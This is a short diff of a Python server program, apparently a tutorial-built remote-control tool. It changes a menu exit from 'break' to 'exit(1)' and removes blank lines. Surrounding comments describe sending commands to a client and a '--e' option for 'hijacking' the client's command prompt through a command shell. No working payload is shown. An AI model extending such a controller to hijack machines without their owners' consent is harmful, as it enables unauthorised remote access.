@@ -196,7 +196,7 @@ def main_menu():
         # --x or exit: Command for Close Server, Client and Connection
         elif strChoice == '--x' or strChoice == 'exit':
             close()
-            break
+            exit(1)
 
         # Invalid Choice
         else:
@@ -374,7 +374,6 @@ def command_shell():
             print(strDefault, end='')
 
 
-
 # Step 19: Define `send_commands()` Function to Send Commands to the Client
 # All Commands except Main Menu Commands should define in this function
 
@@ -408,7 +407,6 @@ def send_commands():
         # --e: Used for Hijacking Client Command Prompt
         elif strChoice[:3] == '--e':
             command_shell()
-
 
         # TODO: Own Implementation
         # --h, See Commands List Help Menu
